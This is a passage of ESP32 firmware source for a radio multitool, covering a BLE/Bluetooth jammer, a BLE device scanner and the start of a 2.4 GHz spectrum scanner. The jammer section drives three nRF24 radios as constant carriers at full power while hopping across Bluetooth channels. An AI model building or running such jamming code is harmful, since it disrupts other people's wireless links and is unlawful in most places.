#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

volatile bool modeChangeRequested = false;
volatile bool jammerToggleRequested = false;

static constexpr int JAMMER_LOG_TOP = 48;

static int jammerVisibleLines() {
  return bleMaxLinesInZone(JAMMER_LOG_TOP, LINE_HEIGHT);
}

static bool jammerLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= bleContentBottom();
}

void scroll() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  const int visibleLines = jammerVisibleLines();
  if (Index >= visibleLines) {
    for (int i = 0; i < visibleLines - 1; i++) {
      Buffer[i] = Buffer[i + 1];
      Buffercolor[i] = Buffercolor[i + 1];
    }
    Index = visibleLines - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < visibleLines) {
    Buffer[Index] = "";
    Buffercolor[Index] = WHITE;
    Index++;
  }

  for (int i = 0; i < Index && i < visibleLines; i++) {
    int yPos = (i * LINE_HEIGHT) + JAMMER_LOG_TOP;
    if (!jammerLineFits(yPos)) {
      continue;
    }

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

void checkButtons() {
  // Remapped layout: SELECT toggles the jammer on/off (was UP -- this is the
  // screen's most important action), RIGHT changes mode (was LEFT/RIGHT
  // both; LEFT is now the universal Exit, handled in blejamLoop).
  //
  // Edge-detected through the centrally debounced isButtonPressedEdge()
  // (~25ms lockout, independent per button) instead of a level check gated
  // by one shared 500ms timer -- that old lockout was long enough, and
  // shared between both buttons, to drop a legitimate quick second press
  // (e.g. mashing Toggle, or Toggle immediately followed by Mode).
  if (isButtonPressedEdge(BTN_SELECT)) {
    jammerToggleRequested = true;
  }

  if (isButtonPressedEdge(BTN_RIGHT)) {
    modeChangeRequested = true;
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);

  for (size_t i = 0; i < size; i++) {
    radio.setChannel(channels[i]);
    radio.startConstCarrier(RF24_PA_MAX, channels[i]);
  }
}

void initializeRadiosMultiMode() {
  bool radio1Active = false;
  bool radio2Active = false;
  bool radio3Active = false;

  if (radio1.begin()) {
    configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
    radio1Active = true;
  }
  if (radio2.begin()) {
    configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
    radio2Active = true;
  }
  if (radio3.begin()) {
    configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
    radio3Active = true;
  }
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();

  } else {
    radio1.powerDown();
    radio2.powerDown();
    radio3.powerDown();
  }
}

void updateTFT() {
  static bool previousJammerState = false;
  static bool prevNRF1State = false;
  static bool prevNRF2State = false;
  static int previousMode = -1;

  const int bodyH = bleContentBottom() - 39;
  if (bodyH > 0) {
    tft.fillRect(0, 39, 240, bodyH, TFT_BLACK);
  }
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);

  tft.setTextSize(1);

  // Remapped layout: SELECT toggles on/off (was UP; no SELECT icon bitmap
  // exists in this firmware, so its state is shown as plain status text --
  // the touch nav bar's center "Toggle" label already names the button).
  // RIGHT changes mode (was LEFT/RIGHT both). LEFT is the universal Exit and
  // needs no guide slot here.
  tft.setTextColor(jammerActive ? UI_OK : UI_TEXT, DARK_GRAY);
  tft.setCursor(20, 23);
  tft.print(jammerActive ? "[ON]" : "[OFF]");

  tft.drawFastVLine(152, 22, 12, LIGHT_GRAY);

  tft.drawBitmap(160, 19, bitmap_icon_RIGHT, 16, 16, UI_ICON);
  tft.setTextColor(UI_TEXT, DARK_GRAY);
  tft.setCursor(178, 23);
  tft.print("MODE");

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.drawFastHLine(0, 35, 240, UI_LINE);
}

void checkModeChange() {
  checkButtons();

  if (modeChangeRequested) {
    modeChangeRequested = false;
    currentMode = static_cast<OperationMode>((currentMode + 1) % 2);
    initializeRadios();
    updateTFT();

    String modeText = "[+] Mode changed to: ";
    modeText += (currentMode == BLE_MODULE) ? "BLE" : "Bluetooth";
    Print(modeText, UI_TEXT, false);
  }

  if (jammerToggleRequested) {
    jammerToggleRequested = false;
    jammerActive = !jammerActive;
    initializeRadios();
    updateTFT();

    String jammerText = "[!] Jammer ";
    jammerText += (jammerActive) ? "Activated" : "Deactivated";
    Print(jammerText, UI_WARN, false);
  }
}

void blejamSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleSetJammerNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  initializeRadios();
  setupTouchscreen();
  updateTFT();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);
#endif

  Print("[+] System Ready!", UI_WARN, true);
  redrawTouchButtonBar();
}

void blejamLoop() {

  // Remapped layout: physical LEFT exits now (was SELECT, moved to the
  // jammer toggle -- see checkButtons()).
  if (feature_active && isButtonPressed(BTN_LEFT)) {
    feature_exit_requested = true;
    return;
  }

  checkModeChange();

  if (jammerActive) {
    if (currentMode == BLE_MODULE) {
      int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
      int channel = ble_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == Bluetooth_MODULE) {
      int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
      int channel = bluetooth_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);
    }
  }

  // Yield to the scheduler so the idle task/watchdog and core-0 radio stack get
  // CPU time; without this the tight loop starves the system and everything lags.
  delay(1);
}

void exit() {

  jammerActive = false;
  initializeRadios();
  restoreSdAfterSharedSpi();
}
}

namespace BleSniffer { void exit(); }

namespace BleScan {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

BLEScan* bleScan;
BLEScanResults bleResults;
bool isScanning = false;
bool isDetailView = false;
int currentIndex = 0;
int listStartIndex = 0;
bool screenNeedsUpdate = true;
bool fullScreenUpdate = true;

static constexpr int yshift = 30;

// Deauther-like list geometry (bigger rows + paging + bottom nav/tab bar).
static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;
static int current_page = 0;

static int bleListBottomY() {
  return featureHasTouchNavBar() ? touchNavContentBottomY() - 4 : 300;
}

static int bleDevicesPerPage() {
  return (bleListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H;
}

static void bleScanClearBody() {
  const int h = bleContentBottom() - 37;
  if (h > 0) {
    tft.fillRect(0, 37, 240, h, TFT_BLACK);
  }
}

static void bleScanUpdateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  // Remapped layout: LEFT=Back (closes the detail screen, or exits the
  // feature from the list -- see handleButtons()), SELECT=View (the most
  // important action, since it opens the detail screen; was Exit), RIGHT=Scan
  // (was toggle View). Up/Down remain Prev/Next.
  if (isDetailView) {
    setTouchNavLabels("Back", nullptr, nullptr, nullptr, "Scan");
  } else {
    setTouchNavLabels("Back", "Next", "View", "Prev", "Scan");
  }
  redrawTouchButtonBar();
}

unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {220, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_go_back
};

static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

static void drawTabBar(const char* leftButton, bool leftDisabled,
                       const char* prevButton, bool prevDisabled,
                       const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    bleScanUpdateNavLabels();
    return;
  }
  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton && leftButton[0]) drawButton(0,   304, 57, 16, leftButton, false, leftDisabled);
  if (prevButton && prevButton[0]) drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  if (nextButton && nextButton[0]) drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
}

static TaskHandle_t bgBleScanTaskHandle = nullptr;
static volatile bool bgHasResults = false;
static volatile uint32_t bgLastScanMs = 0;
static volatile bool bgBleScanRunning = false;
static volatile bool fgBleScanInProgress = false;
static const uint32_t BG_BLE_SCAN_INTERVAL_MS = 15000;
static bool bleInitDone = false;
static const uint32_t BG_BOOT_GRACE_MS = 6000;
static uint32_t bgBootMs = 0;

static void stopBgBleScanIfRunning() {
  if (fgBleScanInProgress || !bleInitDone || !bleScan) return;
  if (!bgBleScanRunning) return;
  bleScan->stop();
  bgBleScanRunning = false;
}

static void ensureBleInit() {
  if (bleInitDone) return;
  if (!ensureBleStackReady()) return;

  bleScan = BLEDevice::getScan();
  bleScan->setActiveScan(true);
  bleInitDone = true;
}

static void bgBleScanTask(void* ) {
  ensureBleInit();
  for (;;) {
    const uint32_t now = millis();
    if (bgBootMs == 0) bgBootMs = now;

    const bool idleOk = (now - bgBootMs) > BG_BOOT_GRACE_MS;
    if (settings().autoBleScan && idleOk && !feature_active && !in_sub_menu) {
      if (fgBleScanInProgress) {
        vTaskDelay(250 / portTICK_PERIOD_MS);
        continue;
      }
      bgBleScanRunning = true;
      isScanning = true;
      bleResults = bleScan->start(2, false);
      isScanning = false;
      bgBleScanRunning = false;
      if (bleResults.getCount() >= 0) {
        bgHasResults = (bleResults.getCount() > 0);
        bgLastScanMs = now;
      }
      vTaskDelay(BG_BLE_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
    } else {
      if (bgBleScanRunning) {
        stopBgBleScanIfRunning();
      }
      vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
  }
}

void displayScanning() {
  bleScanClearBody();
  tft.setTextSize(1);
  tft.setTextColor(GREEN);
  tft.setCursor(10, LIST_HEADER_Y);
  tft.println("Scanning.");

  loading(100, ORANGE, 0, 0, 3, true);
/*
  tft.setCursor(60, LIST_HEADER_Y);
  for (int i = 0; i < 2; i++) {
    for (int j = 0; j <= i; j++) {
      tft.print(".");
      delay(500);
    }
  }
*/
  tft.setCursor(10, LIST_HEADER_Y + 15);
  tft.println("Wait a moment.");
  delay(100);
  isScanning = false;
}

void startBLEScan() {
  pauseBackgroundRadioTasks();
  if (bgBleScanRunning) {
    stopBgBleScanIfRunning();
  }
  displayScanning();
  isDetailView = false;
  current_page = 0;
  currentIndex = 0;
  listStartIndex = 0;
  isScanning = true;
  screenNeedsUpdate = true;
  fullScreenUpdate = true;
  ensureBleInit();
  fgBleScanInProgress = true;
  bleResults = bleScan->start(5, false);
  fgBleScanInProgress = false;
  isScanning = false;
  screenNeedsUpdate = true;

  if (bleResults.getCount() >= 0) {
    bgHasResults = (bleResults.getCount() > 0);
    bgLastScanMs = millis();
  }
}

void handleButtons() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastButtonPress < debounceTime) return;

  int oldPage = current_page;

  if (isButtonPressed(BTN_UP)) {
    if (!isDetailView && currentIndex > 0) {
      currentIndex--;
      delay(200);
      current_page = currentIndex / max(1, bleDevicesPerPage());
      listStartIndex = current_page * bleDevicesPerPage();
      fullScreenUpdate = (current_page != oldPage);
      screenNeedsUpdate = true;
    }
    lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_DOWN)) {
    if (!isDetailView && currentIndex < bleResults.getCount() - 1) {
      currentIndex++;
      delay(200);
      current_page = currentIndex / max(1, bleDevicesPerPage());
      listStartIndex = current_page * bleDevicesPerPage();
      fullScreenUpdate = (current_page != oldPage);
      screenNeedsUpdate = true;
    }
    lastButtonPress = currentMillis;
  }

  // Remapped layout: RIGHT=Scan (was toggle View), SELECT=View the selected
  // device (was Exit -- the feature's most important action, since it opens
  // the detail screen), LEFT=Back from detail / Exit the feature (was
  // Scan/toggle View).
  if (isButtonPressed(BTN_RIGHT)) {
    delay(200);
    if (!isScanning) {
      startBLEScan();
      screenNeedsUpdate = true;
      fullScreenUpdate = true;
    }
    lastButtonPress = currentMillis;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    // Edge, not level: LEFT's meaning changes depending on state (close
    // detail vs. exit the feature), so a held press must not re-fire it a
    // second time with the new meaning.
    if (isDetailView) {
      isDetailView = false;
      fullScreenUpdate = true;
      screenNeedsUpdate = true;
    } else {
      feature_exit_requested = true;
    }
    lastButtonPress = currentMillis;
  }

  if (isButtonPressed(BTN_SELECT)) {
    delay(200);
    if (!isDetailView && !isScanning) {
      isDetailView = true;
      fullScreenUpdate = true;
      screenNeedsUpdate = true;
    }
    lastButtonPress = currentMillis;
  }
}

void updateBLEList() {
  int deviceCount = bleResults.getCount();
  tft.setTextSize(1);

  if (deviceCount <= 0) {
    bleScanClearBody();
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("No devices found.");
    tft.setCursor(10, LIST_HEADER_Y + 12);
    tft.println("Press Rescan.");
    drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int totalPages = (deviceCount + bleDevicesPerPage() - 1) / bleDevicesPerPage();
  if (current_page < 0) current_page = 0;
  if (current_page > totalPages - 1) current_page = max(0, totalPages - 1);
  listStartIndex = current_page * bleDevicesPerPage();

  static int last_rendered_page = -1;
  static int last_rendered_index = -1;

  auto drawRow = [&](int idx, bool selected) {
    if (idx < 0 || idx >= deviceCount) return;
    if (idx < listStartIndex || idx >= listStartIndex + bleDevicesPerPage()) return;
    const int row = idx - listStartIndex;
    const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;

    // Clear only this row (avoid overlapping next row).
    tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
    BLEAdvertisedDevice device = bleResults.getDevice(idx);
    String name = device.getName().length() > 0 ? device.getName().c_str() : "Unknown";
    if (name.length() > 22) name = name.substring(0, 22) + "...";

    tft.setCursor(10, y);
    tft.setTextColor(selected ? ORANGE : WHITE);
    tft.print(selected ? "> " : "  ");
    tft.println(name);
  };

  const bool pageChanged = (current_page != last_rendered_page);
  const bool needFull = fullScreenUpdate || pageChanged || (last_rendered_index < 0);

  if (needFull) {
    bleScanClearBody();
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("Devices:");

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, totalPages);
    tft.setCursor(180, LIST_HEADER_Y);
    tft.setTextColor(GREEN);
    tft.println(page_buf);

    const int end_index = min(listStartIndex + bleDevicesPerPage(), deviceCount);
    for (int i = listStartIndex; i < end_index; i++) {
      drawRow(i, (i == currentIndex));
    }

    const bool prevDisabled = (current_page == 0);
    const bool nextDisabled = ((current_page + 1) * bleDevicesPerPage() >= deviceCount);
    drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);

    last_rendered_page = current_page;
    last_rendered_index = currentIndex;
    return;
  }

  if (last_rendered_index != currentIndex) {
    drawRow(last_rendered_index, false);
    drawRow(currentIndex, true);
    last_rendered_index = currentIndex;
  }
}

void displayBLEDetails() {

  bleScanClearBody();
  tft.setTextSize(1);

  const int deviceCount = bleResults.getCount();
  if (deviceCount <= 0) {
    isDetailView = false;
    screenNeedsUpdate = true;
    fullScreenUpdate = true;
    return;
  }
  if (currentIndex < 0) currentIndex = 0;
  if (currentIndex >= deviceCount) currentIndex = deviceCount - 1;

  BLEAdvertisedDevice device = bleResults.getDevice(currentIndex);
  String deviceName = device.getName().length() > 0 ? device.getName().c_str() : "Unknown Device";
  String address = device.getAddress().toString().c_str();
  int rssi = device.getRSSI();
  int txPower = device.getTXPower();

  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setTextSize(1);

  int y = 50;
  tft.setCursor(10, y);
  tft.print("Device: " + deviceName);
  y += 20;
  tft.setCursor(10, y);
  tft.print("MAC: " + address);
  y += 20;
  tft.setCursor(10, y);
  tft.print("RSSI: " + String(rssi) + " dBm");
  y += 20;
  tft.setCursor(10, y);
  tft.print("Tx Power: " + String(txPower) + " dBm");

  if (device.haveServiceUUID()) {
    y += 20;
    tft.setCursor(10, y);
    tft.print("Service UUID: " + String(device.getServiceUUID().toString().c_str()));
  } else {
    y += 20;
    tft.setCursor(10, y);
    tft.print("No Service UUID");
  }
  if (device.haveManufacturerData()) {
    String manufacturerData = String((char*)device.getManufacturerData().c_str());
    y += 20;
    tft.setCursor(10, y);
    tft.print("Manufacturer: " + manufacturerData);
  } else {
    y += 20;
    tft.setCursor(10, y);
    tft.print("No Manufacturer Data");
  }
  if (device.haveServiceData()) {
    String serviceData = String((char*)device.getServiceData().c_str());
    y += 30;
    tft.setCursor(10, y);
    tft.print("Service Data: " + serviceData);
  } else {
    y += 30;
    tft.setCursor(10, y);
    tft.print("No Service Data");
  }

  drawTabBar("Rescan", false, "", true, "Back", false);
}

void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          if (!isScanning) {
            startBLEScan();
          }
          break;
        case 1:
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 120;
  static uint32_t lastTouchActionMs = 0;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
  int x, y;
  if (feature_active && readTouchXY(x, y)) {
      const uint32_t nowMs = millis();
      if (nowMs - lastTouchActionMs < 250) {
        lastTouchCheck = millis();
        return;
      }
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
              lastTouchActionMs = nowMs;
            }
            break;
          }
        }
      } else if (!isScanning) {
        const int deviceCount = bleResults.getCount();

        if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
          const bool prevDisabled = (current_page == 0);
          const bool nextDisabled = ((current_page + 1) * bleDevicesPerPage() >= deviceCount);

          if (x >= 0 && x <= 57) {
            drawButton(0, 304, 57, 16, "Rescan", true, false);
            delay(50);
            startBLEScan();
            lastTouchActionMs = nowMs;
          } else if (x >= 117 && x <= 179 && !isDetailView && !prevDisabled) {
            drawButton(117, 304, 57, 16, "Prev", true, false);
            current_page--;
            if (current_page < 0) current_page = 0;
            currentIndex = current_page * bleDevicesPerPage();
            listStartIndex = current_page * bleDevicesPerPage();
            screenNeedsUpdate = true;
            fullScreenUpdate = true;
            lastTouchActionMs = nowMs;
          } else if (x >= 177 && x <= 240) {
            if (isDetailView) {
              drawButton(177, 304, 57, 16, "Back", true, false);
              isDetailView = false;
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            } else if (!nextDisabled) {
              drawButton(177, 304, 57, 16, "Next", true, false);
              current_page++;
              currentIndex = current_page * bleDevicesPerPage();
              listStartIndex = current_page * bleDevicesPerPage();
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            }
          }
        } else if (!isDetailView) {
          const int listMaxY = LIST_FIRST_ROW_Y + (bleDevicesPerPage() * LIST_ROW_H);
          if (deviceCount > 0 && y >= LIST_FIRST_ROW_Y && y < listMaxY) {
            const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
            const int idx = (current_page * bleDevicesPerPage()) + row;
            if (idx >= 0 && idx < deviceCount) {
              currentIndex = idx;
              isDetailView = true;
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            }
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void bleScanSetup() {
  BleSniffer::exit();
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleScanUpdateNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  uiDrawn = false;
  runUI();

  setupTouchscreen();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
#endif

  ensureBleInit();

  // With auto BLE scan off, cached bleResults are not updated â€” only reuse when background scan is on.
  if (settings().autoBleScan && bgHasResults && bleResults.getCount() > 0) {
    current_page = 0;
    currentIndex = 0;
    listStartIndex = 0;
    isDetailView = false;
    screenNeedsUpdate = true;
    fullScreenUpdate = true;
    updateBLEList();
  } else {
    startBLEScan();
  }

  redrawTouchButtonBar();
}

void bleScanLoop() {

  // Exit is now handled inside handleButtons() (physical LEFT, state-aware:
  // closes the detail view first, then exits the feature) -- no separate
  // top-level SELECT check anymore.
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  handleButtons();

  runUI();
  updateStatusBar();

  if (screenNeedsUpdate) {
    screenNeedsUpdate = false;
    if (isScanning) {
      displayScanning();
    } else if (!isDetailView) {
      updateBLEList();
    } else {
      displayBLEDetails();
    }
    if (fullScreenUpdate) fullScreenUpdate = false;
  }
}

void startBackgroundScanner() {
  if (bgBleScanTaskHandle != nullptr) return;
  xTaskCreatePinnedToCore(
    bgBleScanTask,
    "bgBleScan",
    4096,
    nullptr,
    1,
    &bgBleScanTaskHandle,
    0
  );
}

int getLastCount() {

  if (!settings().autoBleScan) return 0;
  return bleResults.getCount();
}

void exit() {
  fgBleScanInProgress = false;
  if (bgBleScanRunning) {
    stopBgBleScanIfRunning();
  }
  if (isScanning && bleScan) {
    bleScan->stop();
    isScanning = false;
  }
}
}

namespace Scanner {

#define CE  NRF24_SCAN_CE
#define CSN NRF24_SCAN_CSN

#define CHANNELS  ESP32DIV_BLE_SCANNER_CHANS
int channel[CHANNELS];

#define N ESP32DIV_BLE_SCANNER_BARS
uint8_t values[N];

static bool uiDrawn = false;

static constexpr uint16_t SCAN_SWEEPS        = 25;
static constexpr uint16_t DISPLAY_SWEEPS     = 10;
static constexpr uint16_t RX_SETTLE_US       = 100;
static constexpr uint16_t RPD_DWELL_US       = 50;
static constexpr uint32_t UI_THROTTLE_MS     = 35;
static constexpr uint16_t BUTTON_POLL_STRIDE = 8;

#define _NRF24_CONFIG   0x00
#define _NRF24_EN_AA    0x01
#define _NRF24_RF_CH    0x05
#define _NRF24_RF_SETUP 0x06
#define _NRF24_RPD      0x09

int backgroundNoise[CHANNELS] = {0};

volatile bool scanning = true;

static constexpr int kScannerGraphTop = 190;
static constexpr int kScannerLogBottom = kScannerGraphTop - 6;
static constexpr int kScannerToolbarBottom = 36;
static constexpr int kScannerToolbarGap = 8;
static constexpr int kScannerBoxPad = 4;
static constexpr int kScannerBoxHeaderH = 15;
static constexpr int kScannerStatusY = kScannerToolbarBottom + kScannerToolbarGap;
static constexpr int kScannerGraphMarginX = 6;
static constexpr int kScannerBarColGap = 10;
#if BOARD_HAS_ESP32S3
static constexpr int kScannerBarsPerCol = 64;
#else
static constexpr int kScannerBarsPerCol = 32;
#endif
static constexpr int kScannerStatusLineCount = 6;
static constexpr int kScannerStatusTextY = kScannerStatusY + kScannerBoxHeaderH;
static constexpr int kScannerStatusBoxH = 91;
static constexpr int kScannerLogGap = 4;
static constexpr int kScannerLogBoxH = 49;
static constexpr int kScannerLogBoxTop = kScannerStatusY + kScannerStatusBoxH + kScannerLogGap;
static constexpr int kScannerLogStartY = kScannerLogBoxTop + kScannerBoxHeaderH;
static constexpr int kScannerLogEndY = kScannerLogBoxTop + kScannerLogBoxH - 2;

#define SCREEN_HEIGHT 180
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

// Remapped layout: LEFT is the universal Exit now (was SELECT); renamed
// from isSelectButtonPressed() to match.
bool isExitButtonPressed() {
  return isButtonPressed(BTN_LEFT);
}

byte getRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

bool carrierDetected() {
  return getRegister(_NRF24_RPD) & 0x01;
}

void setRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

void setChannel(uint8_t channel) {
  setRegister(_NRF24_RF_CH, channel);
}

void powerUp() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x02);
  delayMicroseconds(130);
}

void powerDown() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) & ~0x02);
}

void enable() {
  digitalWrite(CE, HIGH);
}

void disable() {
  digitalWrite(CE, LOW);
}

void setRX() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x01);
  enable();
  delayMicroseconds(100);
}

void scroll() {
  for (int i = 3; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  const bool scrolled = (Index >= MAX_LINES - 1);
  if (scrolled) {
    scroll();
    Index = MAX_LINES - 1;
  }

  const int firstNewIndex = Index;
  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = WHITE;
    Index++;
  }

  static auto redrawLogLine = [](int bufIndex) {
    if (bufIndex < 3) {
      return;
    }
    const int yPos = kScannerLogStartY + (bufIndex - 3) * LINE_HEIGHT;
    if (yPos + LINE_HEIGHT > kScannerLogEndY) {
      return;
    }
    tft.fillRect(8, yPos, tft.width() - 16, LINE_HEIGHT, TFT_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(Buffercolor[bufIndex], TFT_BLACK);
    tft.setCursor(8, yPos);
    tft.print(Buffer[bufIndex]);
  };

  if (scrolled) {
    for (int i = 3; i < Index; i++) {
      redrawLogLine(i);
    }
    return;
  }

  for (int i = firstNewIndex; i < Index; i++) {
    redrawLogLine(i);
  }
}

static unsigned long s_scannerLastBtnMs = 0;
static constexpr unsigned long kScannerNavDebounceMs = 80;

void calibrateBackgroundNoise();
void scan();
static String scannerChannelGHzText(int ch);
static String scannerBandHint(int ch);

static void scannerWaitNavRelease(int pin) {
  const uint32_t t0 = millis();
  while (isTouchNavButtonPressed(pin) && millis() - t0 < 400) {
    delay(5);
  }
  delay(30);
}

void scannerHandleNavButtons() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const uint32_t now = millis();
  if (now - s_scannerLastBtnMs < kScannerNavDebounceMs) {
    return;
  }

  // Remapped layout: SELECT=Scan (the most important action -- refreshes
  // the reading, was Exit), RIGHT=Calibrate (secondary, was LEFT). LEFT is
  // the universal Exit, handled in scannerPollNavButtons(). Also switched
  // from isTouchNavButtonPressedEdge (touch-tap only) to isButtonPressedEdge
  // so the physical buttons actually trigger these actions too.
  if (isButtonPressedEdge(BTN_SELECT)) {
    scan();
    s_scannerLastBtnMs = millis();
    scannerWaitNavRelease(BTN_SELECT);
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    calibrateBackgroundNoise();
    s_scannerLastBtnMs = millis();
